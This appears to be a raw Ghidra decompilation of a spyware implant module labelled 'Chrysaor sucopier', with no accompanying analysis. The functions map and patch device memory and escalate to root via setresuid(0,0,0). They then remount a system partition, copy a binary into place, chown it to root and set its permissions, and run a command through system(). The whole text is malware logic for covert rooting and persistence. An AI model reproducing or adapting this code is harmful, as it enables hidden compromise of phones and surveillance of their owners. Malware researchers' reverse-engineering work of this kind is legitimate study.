/* Chrysaor native reassembly: sucopier / module implant */
/* Ghidra decompile - canonical sample ade8bef0... */

/* === FUN_00008b00 @ 0x00008b00 === */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00008b00(int *param_1)

{
  int *piVar1;
  
  piVar1 = param_1 + 1;
  if (*param_1 == s__pK__c__s_00008b28._0_4_) goto LAB_00008b1a;
  do {
    do {
      param_1 = piVar1;
      piVar1 = param_1 + 1;
    } while (*param_1 != s__pK__c__s_00008b28._0_4_);
LAB_00008b1a:
  } while ((param_1[1] != s__pK__c__s_00008b28._4_4_) || (piVar1[1] != ram0x00008b30));
  return;
}

/* === FUN_00008b40 @ 0x00008b40 === */

void FUN_00008b40(char *param_1)

{
  int iVar1;
  int iVar2;
  FILE *__stream;
  char *pcVar3;
  ulong uVar4;
  int iVar5;
  char *__delim;
  int iVar6;
  
  iVar2 = DAT_00008bfc;
  iVar1 = DAT_00008bf8;
  iVar6 = DAT_00008bf4 + 0x8b58;
  *(undefined4 *)(&stack0x000001e0 + DAT_00008bfc) = **(undefined4 **)(iVar6 + DAT_00008bf8);
  __stream = fopen((char *)(DAT_00008c04 + 0x8b6c),(char *)(DAT_00008c00 + 0x8b6e));
  __delim = (char *)(DAT_00008c08 + 0x8b7e);
  do {
    do {
      do {
        pcVar3 = fgets(&stack0xffffffe0 + iVar2,0x200,__stream);
        pcVar3 = strtok(pcVar3,__delim);
        uVar4 = strtoul(pcVar3,(char **)0x0,0x10);
      } while (pcVar3 == (char *)0x0);
      pcVar3 = strtok((char *)0x0,__delim);
    } while (pcVar3 == (char *)0x0);
    pcVar3 = strtok((char *)0x0,__delim);
    iVar5 = strncmp(param_1,pcVar3,0xe);
  } while (iVar5 != 0);
  fclose(__stream);
  if (uVar4 == 0) {
    uVar4 = 0xffffffff;
  }
  if (*(int *)(&stack0x000001e0 + iVar2) == **(int **)(iVar6 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar4);
}

/* === FUN_00008c0c @ 0x00008c0c === */

undefined4 FUN_00008c0c(int param_1)

{
  int __fd;
  int iVar1;
  void *__addr;
  undefined4 uVar2;
  int *piVar3;
  int *piVar4;
  void *pvVar6;
  int iVar7;
  undefined4 *puVar8;
  int *piVar5;
  
  __fd = open(*(char **)(param_1 + 4),2);
  if (__fd == -1) {
    return 0xffffffff;
  }
  *(int *)(param_1 + 8) = __fd;
  iVar1 = (**(code **)(param_1 + 0x2c))(param_1);
  if ((iVar1 == -1) ||
     (__addr = mmap((void *)0x0,*(size_t *)(param_1 + 0x18),3,1,*(int *)(param_1 + 8),
                    *(__off_t *)(param_1 + 0x14)), __addr == (void *)0xffffffff)) {
    close(__fd);
    return 0xffffffff;
  }
  pvVar6 = __addr;
  if (*(int *)(param_1 + 0x1c) != 0) {
    pvVar6 = (void *)(*(int *)(param_1 + 0x1c) * 4 + (int)__addr);
  }
  iVar7 = DAT_00008d44 + 0x8c62;
  iVar1 = FUN_00008b40(iVar7);
  puVar8 = (undefined4 *)0x0;
  if (iVar1 == -1) {
    puVar8 = (undefined4 *)FUN_00008b00(pvVar6);
    if (puVar8 != (undefined4 *)0x0) {
      *puVar8 = DAT_00008d54;
      sleep(4);
      iVar1 = FUN_00008b40(iVar7);
      if (iVar1 != -1) goto LAB_00008c72;
      *puVar8 = DAT_00008d4c;
    }
    uVar2 = 0xffffffff;
    close(__fd);
  }
  else {
LAB_00008c72:
    piVar3 = (int *)((iVar1 + 0x40000000 >> 2) * 4 + (int)pvVar6);
    piVar4 = piVar3;
    do {
      piVar5 = piVar4 + 1;
      if (*piVar4 == DAT_00008d48) break;
      piVar4 = piVar5;
    } while (piVar5 != piVar3 + 0x80);
    if (puVar8 != (undefined4 *)0x0) {
      *puVar8 = DAT_00008d4c;
    }
    *piVar4 = DAT_00008d50;
    (**(code **)(param_1 + 0x30))(param_1);
    sleep(2);
    setresuid(0,0,0);
    setresuid(0,0,0);
    *piVar4 = DAT_00008d48;
    (**(code **)(param_1 + 0x30))(param_1);
    sleep(2);
    msync(__addr,*(size_t *)(param_1 + 0x14),4);
    munmap(__addr,*(size_t *)(param_1 + 0x14));
    uVar2 = 0;
  }
  return uVar2;
}

/* === FUN_00008d58 @ 0x00008d58 === */

undefined4 FUN_00008d58(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *(int *)(DAT_00008d7c + 0x8d60);
  iVar3 = iVar2 + 0x138;
  do {
    iVar1 = FUN_00008c0c(iVar2);
    if (iVar1 == 0) {
      return 0;
    }
    iVar2 = iVar2 + 0x34;
  } while (iVar2 != iVar3);
  return 0xffffffff;
}

/* === FUN_00008d80 @ 0x00008d80 === */

void FUN_00008d80(int param_1)

{
  ioctl(*(int *)(param_1 + 8),DAT_00008d98,*(undefined4 *)(param_1 + 0x1c),
        *(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x1c),
        *(undefined4 *)(param_1 + 0x18));
  return;
}

/* === FUN_00008f8c @ 0x00008f8c === */

void FUN_00008f8c(char *param_1,char *param_2)

{
  undefined1 *__buf;
  int iVar1;
  int iVar2;
  int __fd;
  int iVar3;
  size_t __n;
  int iVar4;
  int *piVar5;
  undefined4 *puVar6;
  undefined4 uVar7;
  undefined1 *__buf_00;
  int iVar8;
  
  iVar2 = DAT_00009084;
  iVar1 = DAT_00009080;
  iVar8 = DAT_0000907c + 0x8fa2;
  *(undefined4 *)(&stack0xffffffe0 + DAT_00009088 + DAT_00009080) =
       **(undefined4 **)(iVar8 + DAT_00009084);
  __fd = open(param_1,0);
  if (-1 < __fd) {
    iVar3 = open(param_2,0xc1,0x1b6);
    __buf = &stack0xffffffe4 + iVar1;
    if (iVar3 < 0) {
LAB_00009068:
      puVar6 = (undefined4 *)__errno();
      uVar7 = *puVar6;
      close(__fd);
    }
    else {
LAB_00008fd4:
      __n = read(__fd,__buf,0x1000);
      if (0 < (int)__n) {
        iVar4 = write(iVar3,__buf,__n);
        __buf_00 = __buf;
        if (iVar4 < 0) goto LAB_0000900a;
        do {
          __n = __n - iVar4;
          __buf_00 = __buf_00 + iVar4;
          while( true ) {
            if ((int)__n < 1) goto LAB_00008fd4;
            iVar4 = write(iVar3,__buf_00,__n);
            if (-1 < iVar4) break;
LAB_0000900a:
            piVar5 = (int *)__errno();
            if (*piVar5 != 4) goto LAB_00009014;
          }
        } while( true );
      }
      if (__n == 0) {
        iVar3 = close(iVar3);
        if (-1 < iVar3) {
          close(__fd);
          uVar7 = 0;
          goto LAB_00009030;
        }
        goto LAB_00009068;
      }
LAB_00009014:
      puVar6 = (undefined4 *)__errno();
      uVar7 = *puVar6;
      close(__fd);
      close(iVar3);
    }
    puVar6 = (undefined4 *)__errno();
    *puVar6 = uVar7;
  }
  uVar7 = 0xffffffff;
LAB_00009030:
  if (*(int *)(&stack0xffffffe0 + DAT_00009088 + iVar1) == **(int **)(iVar8 + iVar2)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar7);
}

/* === FUN_00009090 @ 0x00009090 === */

void FUN_00009090(int param_1)

{
  if (param_1 == 0) {
    mount((char *)(DAT_000090d4 + 0x90a8),(char *)(DAT_000090d8 + 0x90aa),
          (char *)(DAT_000090dc + 0x90ac),DAT_000090e0,(void *)(DAT_000090d0 + 0x90a4));
  }
  else {
    mount((char *)(DAT_000090e8 + 0x90ca),(char *)(DAT_000090ec + 0x90c4),
          (char *)(DAT_000090f0 + 0x90c6),DAT_000090f4,(void *)(DAT_000090e4 + 0x90c0));
  }
  return;
}

/* === FUN_000090f8 @ 0x000090f8 === */

void FUN_000090f8(undefined4 param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  ssize_t sVar3;
  __uid_t _Var4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  char *__buf;
  undefined4 *puVar8;
  
  iVar2 = DAT_00009200;
  iVar1 = DAT_000091fc;
  puVar8 = (undefined4 *)(&stack0xffffffe0 + DAT_000091fc);
  iVar7 = DAT_00009204 + 0x9114;
  __buf = &stack0xffffffe0 + DAT_0000920c + DAT_000091fc;
  *(undefined4 *)(&stack0xffffffe0 + DAT_00009208 + DAT_000091fc) =
       **(undefined4 **)(iVar7 + DAT_00009200);
  getuid();
  memset(__buf,0,0x400);
  sVar3 = readlink((char *)(DAT_00009210 + 0x9138),__buf,DAT_00009214);
  if (sVar3 != -1) {
    _Var4 = getuid();
    if (_Var4 == 0) {
      iVar5 = FUN_00009090(1);
      if (iVar5 != -1) {
        iVar5 = FUN_00008f8c(param_1,param_2);
        if (((iVar5 == 0) && (iVar5 = chown(param_2,0,0), iVar5 == 0)) &&
           (iVar5 = chmod(param_2,DAT_00009218), iVar5 == 0)) {
          FUN_00009090(0);
          sleep(10);
          uVar6 = 0;
        }
        else {
          FUN_00009090(0);
          uVar6 = 0xffffffff;
        }
        goto LAB_00009164;
      }
    }
    else {
      iVar5 = FUN_00008d58();
      _Var4 = getuid();
      setresuid(0,0,0);
      if ((_Var4 == 0) && (iVar5 == 0)) {
        *puVar8 = param_2;
        sprintf(&stack0xffffffec + iVar1,(char *)(DAT_0000921c + 0x91d2),__buf,param_1);
        iVar5 = system(&stack0xffffffec + iVar1);
        uVar6 = 0;
        if (iVar5 == 0) goto LAB_00009164;
      }
    }
  }
  uVar6 = 0xffffffff;
LAB_00009164:
  if (*(int *)(&stack0xffffffe0 + DAT_00009208 + iVar1) != **(int **)(iVar7 + iVar2)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar6);
  }
  return;
}

